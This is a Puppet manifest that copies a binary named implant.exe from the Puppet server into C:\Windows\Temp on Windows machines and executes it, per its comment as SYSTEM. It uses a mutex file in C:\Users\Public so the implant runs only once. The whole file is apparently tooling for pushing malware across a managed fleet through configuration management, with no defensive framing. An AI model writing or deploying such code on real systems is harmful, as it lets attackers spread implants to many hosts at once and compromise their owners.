class windows_runbinary {

  file { 'C:\Windows\Temp\implant.exe':
    ensure => file,
    source => 'puppet:///modules/windows_runbinary/implant.exe',
    owner  => 'Administrator',
    group  => 'Administrators',
    mode   => '0777',
  }

  # Run the binary as SYSTEM only if C:\Users\Public\implant_mutex_file.txt does not exist
  exec { 'run_implant':
    command  => 'C:\Windows\Temp\implant.exe',
    creates  => 'C:\Users\Public\implant_mutex_file.txt',
    provider => 'windows',
    require  => File['C:\Windows\Temp\implant.exe'],
  }

  file { 'C:\Users\Public\implant_mutex_file.txt':
    ensure  => file,
    content => 'Mutex file to prevent multiple executions',
    owner   => 'Administrator',
    group   => 'Administrators',
    mode    => '0644',
    require => Exec['run_implant'],
  }
}
